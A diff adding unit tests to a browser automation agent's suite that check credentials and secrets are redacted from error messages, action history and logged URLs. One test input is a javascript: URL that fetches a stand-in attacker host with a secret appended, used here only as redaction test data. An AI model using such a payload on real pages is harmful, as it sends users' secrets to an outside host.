@@ -461,6 +461,35 @@ class CredentialHandlingTests(AgentTestCase):
             'the password is retained in action_history through the error '
             'message')
 
+    def test_every_sensitive_argument_is_scrubbed_from_an_error(self):
+        """The error-string scrub is driven by what was sent, so it has to
+        look at every sensitive argument, not only `text`: set_value sends
+        `value`, execute_script sends `script`, and a caller can send
+        `password` through call_tool. Each comes back inside the extension's
+        not-found error under no key that marks it."""
+        for key, call in (
+            ('value', lambda a: a.set_value('#card', PASSWORD)),
+            ('script', lambda a: a.execute_script(PASSWORD)),
+            ('password', lambda a: a.call_tool('browser_type',
+                                               password=PASSWORD)),
+        ):
+            with self.subTest(argument=key):
+                self.serve_element_not_found(**{key: PASSWORD})
+                agent = browser_agent.BrowserAutomationAgent(verbose=True)
+                _, out = self.capture(call, agent)
+                self.assertNotIn(PASSWORD, out)
+                self.assertNotIn(PASSWORD, self.history_dump(agent))
+
+    def test_a_three_character_secret_is_scrubbed_from_an_error(self):
+        """A card CVC or a short PIN is three characters. The floor exists so
+        a one- or two-character value does not blank ordinary prose; it must
+        not also let the shortest real secrets through."""
+        self.serve_element_not_found(text='123', selector='#cvc')
+        agent = browser_agent.BrowserAutomationAgent(verbose=True)
+        _, out = self.capture(agent.type_text, '123', selector='#cvc')
+        self.assertNotIn('123', out)
+        self.assertNotIn('123', self.history_dump(agent))
+
     # Regression test for defect D3.
     def test_an_abandoned_login_does_not_quote_the_password_back(self):
         """login() explains why it stopped, and the reason it quotes is the
@@ -605,6 +634,31 @@ class RedactionListParityTests(unittest.TestCase):
                 self.assertNotIn(secret, str(out), out)
                 self.assertIn('test', str(out['url']),
                               'the host is what a log is read for')
+
+    def test_a_url_of_an_unusual_shape_is_still_reduced(self):
+        """The three branches of _reduce_url that the plain https cases above
+        never reach, each with its own way of leaking."""
+        for raw, secrets, kept in (
+            # Not a location but a payload: the whole of it is the secret.
+            ('javascript:fetch("//evil.test/?c="+S3CRET)', ['S3CRET'],
+             'javascript'),
+            ('data:text/html,<p>S3CRET</p>', ['S3CRET'], 'data'),
+            # An unescaped '@' in the password: only the LAST '@' ends the
+            # userinfo, so splitting at the first one keeps half of it.
+            ('https://usr:PW1@PW2@h.test/', ['usr', 'PW1', 'PW2'], 'h.test'),
+            # urlsplit raises on an unclosed IPv6 bracket. The raw value is
+            # unparsed, not safe: it still holds the query.
+            ('http://[bad/?token=S3CRET', ['S3CRET'], None),
+        ):
+            for name, out in (
+                ('argument', browser_agent._redact({'url': raw})),
+                ('result', browser_agent._redact_result({'url': raw}, ())),
+            ):
+                with self.subTest(url=raw, via=name):
+                    for secret in secrets:
+                        self.assertNotIn(secret, str(out), out)
+                    if kept:
+                        self.assertIn(kept, out['url'])
 
     def test_a_pressed_key_is_not_printed(self):
         self.assertEqual(browser_agent._redact({'key': 'h'})['key'], '***')
